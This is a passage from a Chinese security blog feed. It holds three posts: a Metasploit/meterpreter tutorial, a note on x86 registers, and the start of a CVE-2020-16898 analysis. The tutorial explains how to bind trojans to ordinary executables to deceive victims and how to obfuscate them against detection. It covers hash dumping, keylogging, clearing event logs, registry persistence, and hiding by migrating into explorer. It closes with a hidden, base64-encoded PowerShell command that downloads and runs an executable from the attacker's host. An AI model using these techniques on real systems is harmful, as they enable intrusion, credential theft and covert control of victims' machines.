href="#0x02-捆绑、混淆" class="headerlink" title="0x02 捆绑、混淆"></a>0x02 捆绑、混淆</h2><p>注意，这里列举的是一部分msf的功能，但并非所有，可以通过：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-h</span> 对所有的功能参数进行查询，要对某条功能如encoder进行详细查看，使用：</span><br><span class="line">msfvenom <span class="literal">-l</span> encoder 当然，这里也可以替换为其他功能（也就是查看该功能的选项）</span><br></pre></td></tr></table></figure><h3 id="一、捆绑"><a href="#一、捆绑" class="headerlink" title="一、捆绑"></a>一、捆绑</h3><p>捆绑指把木马捆绑在一个正常文件上，在执行正常文件的同时执行木马，迷惑受害者。</p><p>捆绑使用参数<code>-x </code>，后面填所要捆绑的文件的地址即可。</p><p>​    注意：这里可能会报由于没有Entery Point的错误，更换被绑定exe即可</p><h3 id="二、混淆"><a href="#二、混淆" class="headerlink" title="二、混淆"></a>二、混淆</h3><p>混淆是指对木马代码进行处理，使其更难以被识别。</p><p>混淆使用参数<code>-e &#39;混淆器名&#39;</code>（无引号），即encoder，-e后的参数可以通过命令：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-l</span> encoder</span><br></pre></td></tr></table></figure><p>进行查询，常用的有：<code>x86/shikata_ga_nai</code></p><p>​    </p><p>添加参数<code>-i &#39;混淆次数&#39;</code>（无引号），作为混淆次数。</p><h2 id="0x03-meterpreter"><a href="#0x03-meterpreter" class="headerlink" title="0x03 meterpreter"></a>0x03 meterpreter</h2><p>注：在下方列出了很多命令，我们要查询命令集，直接使用<code>?</code>进行查询。</p><p>在木马连接了之后，我们使用<strong>meterpreter</strong>对受害靶机进行操作，那我们能够操作的内容有哪些呢？</p><p><strong>getsystem</strong>命令：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem <span class="literal">-t0</span></span><br></pre></td></tr></table></figure><p>尝试所有可能的方法，获取更高权限（当然大概率是会失败的）。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220325095245215.png" alt="image-20220325095245215"></p><p>但是这里如果我们真的成功获得了权限，可以使用命令：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/hashdump</span><br></pre></td></tr></table></figure><p>得到系统管理员密码的哈希，然后用其他方式进行爆破即可。</p><h3 id="一、文件操作"><a href="#一、文件操作" class="headerlink" title="一、文件操作"></a>一、文件操作</h3><p>​    以下命令操作与linux类似，如不知道应该如何使用，可以直接在<strong>meterpreter</strong>命令行，输入该操作名，或者一般是操作名 <code>-h</code>就会出现相关帮助。</p><p><strong>cat</strong>：Read the contents of a file to the screen<br><strong>cd</strong>：Change directory<br><strong>checksum</strong>：Retrieve the checksum of a file<br><strong>cp</strong>：Copy source to destination<br><strong>del</strong>：Delete the specified file<br><strong>dir</strong>：List files (alias for Is)<br><strong>download</strong>：Download a file or directory<br><strong>edit</strong>：Edit a file<br><strong>getlwd</strong>：Print local working directory<br><strong>getwd</strong>：Print working directory<br><strong>Icd</strong>：Change local working directory<br><strong>lls</strong>：List local files<br><strong>Ipwd</strong>：Print local working directory<br><strong>Is</strong>：List files<br><strong>mkdir</strong>：Make directory<br><strong>mv</strong>：Move source to destination<br><strong>pwd</strong>：Print working directory<br><strong>rm</strong>：Delete the specified file<br><strong>rmdir</strong>：Remove directory<br><strong>search</strong>：Search for files<br><strong>show_ mount</strong>： List all mount points/logical drlves<br><strong>upload</strong>：Upload a fle or directory</p><h3 id="二、系统操作"><a href="#二、系统操作" class="headerlink" title="二、系统操作"></a>二、系统操作</h3><p><strong>clearev</strong>：Clear the event log<br><strong>drop_ token</strong>： Relinquishes any active impersonation token.<br><strong>execute</strong>：Execute a command<br><strong>getenv</strong>：Get one or more environment variable values<br><strong>getpid</strong>：Get the current process identifier<br><strong>getprivs</strong>：Attempt to enable all privileges available to the current process<br><strong>getsid</strong>：Get the SID of the user that the server is running as<br><strong>getuid</strong>：Get the user that the server is running as<br><strong>kill</strong>：Terminate a process<br><strong>localtime：</strong>Displays the target system local date and time<br><strong>pgrep</strong>：Filter processes by name<br><strong>pkill</strong>：Terminate processes by name<br><strong>ps</strong>：List running processes<br><strong>reboot：</strong>Reboots the remote computer<br><strong>reg</strong>：Modify and interact with the remote registry<br><strong>rev2self</strong>：Calls RevertToSelf() on the remote machine（降低权限）<br><strong>shell</strong>：Drop into a system command shell（进入反弹shell）<br><strong>shutdown</strong>：Shuts down the remote computer<br><strong>steal_ token</strong>： Attempts to steal an impersonation token from the target process<br><strong>suspend</strong>：Suspends(挂起) or resumes a list of processes<br><strong>sysinfo</strong>：Gets information about the remote system, such as OS</p><h3 id="三、网络操作"><a href="#三、网络操作" class="headerlink" title="三、网络操作"></a>三、网络操作</h3><p><strong>arp</strong>：Display the host ARP cache<br><strong>getproxy</strong>：Display the current proxy configuration<br><strong>ifconfig</strong>：Display interfaces<br><strong>ipconfig</strong>：Display interfaces<br><strong>netstat：</strong>Display the network connections<br><strong>portfwd</strong>：Forward a local port to a remote service<br><strong>resolve：</strong>Resolve a set of host names on the target<br><strong>route</strong>：View and modify the routing table</p><p>在这里，还需要提出一个重要的概念：</p><h4 id="端口转发："><a href="#端口转发：" class="headerlink" title="端口转发："></a>端口转发：</h4><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220325104616631.png" alt="image-20220325104616631" style="zoom:67%;" /><p>我们在kali上的<strong>meterpreter</strong>中使用命令：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portfwd add <span class="literal">-l</span> <span class="number">6666</span> <span class="literal">-p</span> <span class="number">3389</span> <span class="literal">-r</span> <span class="number">192.168</span>.<span class="number">119.145</span></span><br></pre></td></tr></table></figure><p>其中的参数分别为，本机开放的端口（6666），受害者开放的端口（3389），受害者的ip。</p><p><em>其实我这里也没明白，受害者不是内网IP吗？</em></p><h3 id="四、模拟用户操作"><a href="#四、模拟用户操作" class="headerlink" title="四、模拟用户操作"></a>四、模拟用户操作</h3><p><strong>enumdesktops</strong>： List all accessible desktops and window stations<br><strong>getdesktop</strong>：Get the current meterpreter desktop<br><strong>idletime</strong>：Returns the number of seconds the remote user has been idle<br><strong>keyboard_ send</strong>（模拟键盘输入）：Send keystrokes<br><strong>keyevent</strong>（模拟键盘事件）：Send key events<br><strong>keyscan_ start</strong>（开启键盘记录）：Start capturing keystrokes<br><strong>keyscan_ dump</strong>（输出到目前为止的键盘记录）：Dump the keystroke buffer<br><strong>keyscan_ stop</strong>（停止键盘记录）：Stop capturing keystrokes<br><strong>mouse</strong>（模拟鼠标事件）：Send mouse events<br><strong>screenshare</strong> ：Watch the remote user desktop in real time<br><strong>screenshot</strong>：Grab a screenshot of the interactive desktop<br><strong>setdesktop</strong>：Change the meterpreters current desktop<br><strong>uictl</strong>（夺取对方对于键盘和鼠标的控制权）：Control some of the user interface components</p><h3 id="五、持久化、进程迁移"><a href="#五、持久化、进程迁移" class="headerlink" title="五、持久化、进程迁移"></a>五、持久化、进程迁移</h3><h4 id="持久化："><a href="#持久化：" class="headerlink" title="持久化："></a>持久化：</h4><p>​    持久化就是指目标主机在重启后依然自动进行连接，要做到这一点，我们需要执行在metepreter下通过<code>run</code>命令实现。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run persistence <span class="literal">-h</span> <span class="comment">#查看有关持久化的帮助</span></span><br><span class="line">run persistence <span class="literal">-x</span> <span class="literal">-i</span> <span class="number">3</span> <span class="literal">-p</span> <span class="string">&#x27;监听端口&#x27;</span> <span class="literal">-r</span> <span class="string">&#x27;监听ip&#x27;</span></span><br></pre></td></tr></table></figure><p>第二条命令开启了一个，开机启动（-x），每隔三秒尝试连接一次（-i 3）的持久化连接。</p><p>具体实现是通过更改注册表实现的。</p><h4 id="进程迁移："><a href="#进程迁移：" class="headerlink" title="进程迁移："></a>进程迁移：</h4><p>​    为什么要进行进程迁移呢？其一，我们的木马若是绑定在其他程序上的，其他程序关闭后，木马也被关闭，无法继续运行；其二，若我们的木马是一个单独的进程，容易被发现并且消灭，太过于明显。因此，我们使用进程迁移的方式，让我们的木马附着到其他看似无害的进程上，以达到隐藏的效果。</p><p>​    要进行进程迁移，我们使用的是<code>migrate</code>命令。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">metepreter&gt; migrate <span class="string">&#x27;pid&#x27;</span> <span class="comment">#迁移到pid进程下</span></span><br></pre></td></tr></table></figure><p>注意别迁移到系统进程，容易造成崩溃，一般选择迁移到<strong>explorer</strong>进程中。</p><h2 id="0x04-多个木马连接"><a href="#0x04-多个木马连接" class="headerlink" title="0x04 多个木马连接"></a>0x04 多个木马连接</h2><p>​    metesploit可以通过session来管理对某个木马进行连接的用户，即，当有多个用户对我们的同一个端口部署的同一个木马进行连接时，我们可以保存他们的状态，并使用session来管理他们。</p><p>我们总结一下刚刚我们进行的步骤吧。</p><ol><li><code>msfconsole -q</code>打开msf6&gt;</li><li><code>use exploit/multi/handler</code>选模块，变为<code>msf exploit(muti/handler)&gt;</code></li><li>对所有参数进行配置，例如这里选择了meterpreter，</li><li><code>run</code>或者<code>exploit</code>运行监听，打开了<code>meterpreter&gt;</code>专属的命令行</li><li>然后我们按照0x03的各种操作进行操作即可。</li></ol><p>那么，我们在什么样的情况对sessions进行管理呢？</p><p>​    当我们不想继续进行命令操作的时候，我们就可以<strong>使用命令<code>background</code>退回上一层</strong>，也就是回到<code>msf exploit(muti/handler)&gt;</code>中，进行配置，我们输入命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sessions <span class="comment">#查看现有的session情况</span></span><br><span class="line"><span class="built_in">set</span> exitonsession false <span class="comment">#表示设置允许多个session存在</span></span><br><span class="line">show advanced <span class="comment">#查看拓展设置，包括刚刚设置的内容</span></span><br><span class="line">run <span class="literal">-j</span> <span class="comment">#运行刚刚哪些配置的监听，在后台监听连接</span></span><br><span class="line">jobs <span class="comment">#查看我们在后台运行的所有任务</span></span><br></pre></td></tr></table></figure><p>这样就配置好了一个多任务的环境，此时通过<strong>sessions</strong>命令进行查看，若有多个人进行连接了，我们使用：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session <span class="literal">-i</span> <span class="string">&#x27;sessions序号&#x27;</span></span><br></pre></td></tr></table></figure><p>对他进行meterpreter操作，使用命令<strong>background</strong>或者其简写<strong>bg</strong>退出当前session，最后，我们还可以使用。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">job <span class="literal">-K</span> <span class="comment">#关掉所有正在后台运行的监听任务</span></span><br></pre></td></tr></table></figure><h2 id="0x05-其他模块"><a href="#0x05-其他模块" class="headerlink" title="0x05 其他模块"></a>0x05 其他模块</h2><h3 id="web-delivery："><a href="#web-delivery：" class="headerlink" title="web_delivery："></a>web_delivery：</h3><p>要在对方主机上进行攻击，我们能直接上传并执行我们的木马文件必然是极好的，但是若我们具有exp的权限，能否在仅仅执行一句话的情况下就直接获得metepreter的权限呢？</p><p>我们可以使用模块：exploit/multi/script/<strong>web_delivery</strong>，使用</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">msf  &gt;  use exploit/multi/script/web_delivery</span><br><span class="line">msf  &gt;  show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/script/web_delivery):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SRVHOST  <span class="number">0.0</span>.<span class="number">0.0</span>          yes       The local host or network interface to listen on. This must be an address on the local machine or <span class="number">0.0</span>.<span class="number">0.0</span> to listen on all addresses.</span><br><span class="line">   SRVPORT  <span class="number">8080</span>             yes       The local port to listen on.</span><br><span class="line">   SSL      false            no        Negotiate SSL <span class="keyword">for</span> incoming connections</span><br><span class="line">   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line">   URIPATH                   no        The URI to use <span class="keyword">for</span> this exploit (default is random)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (python/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  <span class="number">4444</span>             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   <span class="number">0</span>   Python</span><br></pre></td></tr></table></figure><p>可以看到，<strong>Payload</strong>、<strong>LHOST</strong>和<strong>LPORT</strong>的设置和上文中提到的方法是一样的，然后我们可以：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/script/web_delivery) &gt; show targets</span><br><span class="line"></span><br><span class="line">Exploit targets:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   <span class="number">0</span>   Python</span><br><span class="line">   <span class="number">1</span>   PHP</span><br><span class="line">   <span class="number">2</span>   PSH</span><br><span class="line">   <span class="number">3</span>   Regsvr32</span><br><span class="line">   <span class="number">4</span>   pubprn</span><br><span class="line">   <span class="number">5</span>   SyncAppvPublishingServer</span><br><span class="line">   <span class="number">6</span>   PSH (Binary)</span><br><span class="line">   <span class="number">7</span>   Linux</span><br><span class="line">   <span class="number">8</span>   Mac OS X</span><br></pre></td></tr></table></figure><p>可以看到，可选的语言还是很多的，我们选择只要是windows就会有的PSH，也就是powershell。</p><p>注：<strong>PSH</strong>和**PSH(Binary)**的区别是生成的内容是是正常的还是二进制编码过的，后者更不容易被识别。</p><p>二进制情况如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-e</span> WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB1AEEAVAA9ACIAZQBjAGgAbwAgACgAJABlAG4AdgA6AHQAZQBtAHAAKwAnAFwAcQBWAFoAWgBnAG0AOAB6AC4AZQB4AGUAJwApACIAOwAgACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADYALgAxADMAMAA6ADgAMAA4ADAALwAnACwAIAAkAHUAQQBUACkAOwAgAGkAbgB2AG8AawBlAC0AaQB0AGUAbQAgACQAdQBBAFQA</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>寄存器总结</title>
      <link href="/2022/03/17/%E5%B8%B8%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8%E5%8F%8A%E5%85%B6%E5%8A%9F%E8%83%BD%E6%80%BB%E7%BB%93/"/>
      <url>/2022/03/17/%E5%B8%B8%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8%E5%8F%8A%E5%85%B6%E5%8A%9F%E8%83%BD%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="寄存器总结"><a href="#寄存器总结" class="headerlink" title="寄存器总结"></a>寄存器总结</h1><p>16个寄存器可以被分成以下四类： </p><p>​    8个通用寄存器(General-purpose registers) </p><p>​    6个段寄存器(Segment registers) </p><p>​    程序状态与控制寄存器(EFLAGS) </p><p>​    指令指针寄存器(EIP register）</p><h2 id="一、通用寄存器"><a href="#一、通用寄存器" class="headerlink" title="一、通用寄存器:"></a>一、通用寄存器:</h2><p>32位CPU通用寄存器共有8个：<strong>EAX，EBX，ECX， EDX，ESI，EDI，EBP，ESP</strong></p><h3 id="第1-4个寄存器"><a href="#第1-4个寄存器" class="headerlink" title="第1- 4个寄存器:"></a>第1- 4个寄存器:</h3><ul><li><p><strong>EAX</strong>：累加寄存器，是操作数和结果数据的累加器 </p></li><li><p><strong>EBX</strong>：基址寄存器，指向DS段中数据的指针 </p></li><li><p><strong>ECX</strong>：计数寄存器，是字符串和循环操作的计数器 </p></li><li><p><strong>EDX</strong>：数据寄存器， I/O指针 </p></li></ul><p>上面4个寄存器主要用于算术运算（ADD/SUB/XOR/OR等） 指令中，常用来保存常量与变量的值</p><h3 id="变址寄存器（第5-6个）"><a href="#变址寄存器（第5-6个）" class="headerlink" title="变址寄存器（第5-6个）:"></a>变址寄存器（第5-6个）:</h3><ul><li><p><strong>ESI</strong>：(字符串操作源指针)源变址寄存器 </p></li><li><p><strong>EDI</strong>：(字符串操作目的指针)目的变址寄存器 </p></li></ul><p>​    <strong>ESI</strong>和<strong>EDI</strong>与特定的串操作指令（MOVS/LODS/STOS）一起使用，在字符串操作的时候用的比较多 </p><p>变址寄存器存放存储单元在段内的偏移量，用它们可实 现多种存储器操作数的寻址方式，为通过多种方式访问 存储单元提供便利</p><h3 id="指针寄存器（第7-8个）"><a href="#指针寄存器（第7-8个）" class="headerlink" title="指针寄存器（第7-8个）:"></a>指针寄存器（第7-8个）:</h3><ul><li><p><strong>ESP</strong>：栈顶指针寄存器，用于存放当前堆栈的栈顶 地址，专门用作堆栈指针，不可作为一般通用寄存 器使用 </p></li><li><p><strong>EBP</strong>：栈底指针寄存器（基址指针寄存器），表示 栈区域的基地址，永远指向当前函数栈的栈底位置， 不可作为一般通用寄存器使用</p></li></ul><h2 id="二、段寄存器"><a href="#二、段寄存器" class="headerlink" title="二、段寄存器:"></a>二、段寄存器:</h2><ul><li><p><strong>CS</strong>：Code Segment，代码段寄存器 – 存放应用程序代码所在段的段基址 </p></li><li><p><strong>DS</strong>：Data Segment，数据段寄存器 – 用于存放数据段的段基址 </p></li><li><p><strong>SS</strong>：Stack Segment，堆栈段寄存器 – 用于存放栈段的段基址 </p></li><li><p><strong>ES</strong>、<strong>FS</strong>、<strong>GS</strong>，附加数据段寄存器 – 用于存放程序使用的附加数据段的段基</p></li></ul><h2 id="三、程序状态与控制寄存器（标志寄存器）"><a href="#三、程序状态与控制寄存器（标志寄存器）" class="headerlink" title="三、程序状态与控制寄存器（标志寄存器）"></a>三、程序状态与控制寄存器（标志寄存器）</h2><p>在IA-32中标志寄存器的名称为<strong>EFLAGS</strong>，大小为4个字节， 共有32个位元，每个位数都有其作用，；</p><p>可以分为以下四类：</p><ul><li>系统标志(位8，9，14，16，17，18，19，20，21)和 IOPL(I/O Privilege Level)字段(位12，13) ： 控制操作系统或执行操作，应用程序不能修改以上标志位 </li><li>方向标志(DF，位10)：控制串操作指令的处理方向 ：DF=0，从低地址到高地址  DF=1，从高地址到低地址 </li><li>状态标志(位0，2，4，6，7和11)：表示算数指令的运 算结果，如ADD、SUB、MUL和DIV指令 ：和应用程序运行状态密切相关，需掌握 </li><li>预留标志位（位1，3，5，15，22-31） ：DO NOT US</li></ul><h3 id="状态标志-位0，2，4，6，7，-和11-："><a href="#状态标志-位0，2，4，6，7，-和11-：" class="headerlink" title="状态标志(位0，2，4，6，7， 和11) ："></a>状态标志(位0，2，4，6，7， 和11) ：</h3><p>（重点）</p><ul><li><p><strong>CF</strong>(位0) – 进位标志位：</p><p>一般情况下，在进行无符号数运算的时候，它记录了 运算结果的最高有效位向更高位的进位值，或从更高位的借位值。 – 在加法运算中，若运算结果从字或字节的最高位产生了进位，则 CF=1；否则CF=0 – 在减法运算中，若被减数无借位，则CF=0；否则CF=1 </p></li><li><p><strong>OF</strong>(位11) – 溢出标志位：</p><p>一般情况下，OF记录了有符号数运算的结果是否发生 了溢出 – 如果发生了溢出，OF=1；如果没有发生溢出，OF=0 – 注：CF和OF所表示的进位和溢出，是分别针对无符号数和有符号数 运算而言的，一定要分清楚CF和OF的发生条件 （2）寄存器 — 程序状态与控制寄存器 </p></li><li><p><strong>AF</strong>(位4) – 辅助进位标志位：</p><p>在发生以下情况时，辅助进位标志AF的值被 置为1，否则其值为0： » 在字操作时，发生低字节向高字节进位或借位时 » 在字节操作时，发生低4位向高4位进位或借位时 </p></li><li><p><strong>PF</strong>(位2) – 奇偶标志位：</p><p>记录相关指令执行后，其结果的最低有效字节中1 的个数是否为偶数 – 如果1的个数为偶数，PF=1；如果1的个数为奇数，PF=0 （2）寄存器 — 程序状态与控制寄存器 </p></li><li><p><strong>SF</strong>(位7) – 符号标志位：</p><p>记录相关指令执行后，其结果是否为负 – 当操作数为有符号数时，若结果为负数，SF=1；若结果为非负数， SF=0 </p></li><li><p><strong>ZF</strong>(位6) – 零标志位：</p><p>记录相关指令执行后，其结果是否为0；若运算结果 为0，则其值为1，否则其值为0</p></li></ul><h2 id="四、指令指针寄存器"><a href="#四、指令指针寄存器" class="headerlink" title="四、指令指针寄存器"></a>四、指令指针寄存器</h2><p>​    程序运行时，CPU会读取<strong>EIP</strong>中一条指令的地址， 将指令传送到指令缓冲区后，<strong>EIP</strong>的值自动增加 </p><p>​    CPU每次执行完一条指令，就会通过<strong>EIP</strong>寄存器 读取并执行下一条指令 </p><p>​    不能直接修改<strong>EIP</strong>的值，只能通过其他指令间接 修改 – 这些特定指令包括JMP、JC、CALL、RET – 可以通过中断或异常来修改<strong>EIP</strong>的值</p>]]></content>
      
      
      <categories>
          
          <category> Note-re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-16898漏洞分析与复现</title>
      <link href="/2022/03/14/CVE-2020-16898%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/03/14/CVE-2020-16898%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2020-16898漏洞分析与复现"><a href="#CVE-2020-16898漏洞分析与复现" class="headerlink" title="CVE-2020-16898漏洞分析与复现"></a>CVE-2020-16898漏洞分析与复现</h1><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220314103347935.png" alt="image-20220314103347935"></p><h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h2><p>​    本漏洞是由于Windows TCP/IP堆栈在处理ICMPv6的路由广播数据包时，处理逻辑存在纰漏，导致存在远程代码执行漏洞。成功利用该漏洞的攻击者可以在目标机器（主机或服务器）上执行任意代码，破环该主机。</p><h2 id="0x02-环境配置"><a href="#0x02-环境配置" class="headerlink" title="0x02 环境配置"></a>0x02 环境配置</h2><p>靶机——win server 2019</p><p>攻击者——win10主机</p><p>靶机使用NAT连接，开启IPV6：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220311094359026.png" alt="image-20220311094359026"></p><p><strong>fd15:4ba5:5a2b:1008:5dfd:a60a:67fe:fb59</strong></p><h2 id="0x03-原理分析"><a href="#0x03-原理分析" class="headerlink" title="0x03 原理分析"></a>0x03 原理分析</h2><h3 id="一、基本信息"><a href="#一、基本信息" class="headerlink" title="一、基本信息"></a>一、基本信息</h3><p>​    漏洞文件：tcpip.sys</p><p>​    漏洞函数：Ipv6pUpdateRDNSS()函数</p><p>​    漏洞对象：ICMPv6路由广播中的option结构</p><h3 id="二、tcpip-sys文件信息收集"><a href="#二、tcpip-sys文件信息收集" class="headerlink" title="二、tcpip.sys文件信息收集"></a>二、tcpip.sys文件信息收集</h3><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220311103501654.png" alt="image-20220311103501654"></p><p>储存路径为：<em>windows\system32\drivers</em></p><h4 id="1-函数调用关系"><a href="#1-函数调用关系" class="headerlink" title="1.函数调用关系"></a>1.函数调用关系</h4><p>直接进入<em>Ipv6pUpdateRDNSS()函数</em>，右键查看调用关系：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220311131254716.png" alt="image-20220311131254716"></p><p><em>Icmpv6ReceiveDatagrams( ) -&gt; Ipv6pHandleRouterAdvertisement( ) -&gt; Ipv6pUpdateRDNSS( )</em></p><h4 id="2-重要结构体"><a href="#2-重要结构体" class="headerlink" title="2.重要结构体"></a>2.重要结构体</h4><p>首先，我们需要先了解一些出现的数据结构。</p><h5 id="NET-BUFFER："><a href="#NET-BUFFER：" class="headerlink" title="_NET_BUFFER："></a>_NET_BUFFER：</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NET_BUFFER</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">      NET_BUFFER *Next;</span><br><span class="line">      MDL        *CurrentMdl;</span><br><span class="line">      ULONG      CurrentMdlOffset;</span><br><span class="line">      <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        ULONG  DataLength;</span><br><span class="line">        SIZE_T stDataLength;</span><br><span class="line">      &#125;;</span><br><span class="line">      MDL        *MdlChain;</span><br><span class="line">      ULONG      DataOffset;</span><br><span class="line">    &#125;;</span><br><span class="line">    SLIST_HEADER      Link;</span><br><span class="line">    NET_BUFFER_HEADER NetBufferHeader;</span><br><span class="line">  &#125;;</span><br><span class="line">  USHORT           ChecksumBias;</span><br><span class="line">  USHORT           Reserved;</span><br><span class="line">  NDIS_HANDLE      NdisPoolHandle;</span><br><span class="line">  PVOID            NdisReserved[<span class="number">2</span>];</span><br><span class="line">  PVOID            ProtocolReserved[<span class="number">6</span>];</span><br><span class="line">  PVOID            MiniportReserved[<span class="number">4</span>];</span><br><span class="line">  PHYSICAL_ADDRESS DataPhysicalAddress;</span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    NET_BUFFER_SHARED_MEMORY *SharedMemoryInfo;</span><br><span class="line">    SCATTER_GATHER_LIST      *ScatterGatherList;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125; NET_BUFFER, *PNET_BUFFER;</span><br><span class="line"></span><br><span class="line"><span class="comment">//from https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/nbl/ns-nbl-net_buffer</span></span><br></pre></td></tr></table></figure><p>在microsoft官网上，说明了_NET_BUFFER的作用：</p><blockquote><p>The NET_BUFFER structure specifies data that is transmitted or received over the network.</p></blockquote><p>用于传输或者接收固定的消息；</p><p>同时给出了：</p><blockquote><p>NDIS drivers can call the following functions to allocate and initialize a NET_BUFFER structure:</p><ul><li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ndis/nf-ndis-ndisallocatenetbuffer">NdisAllocateNetBuffer</a></li><li><a 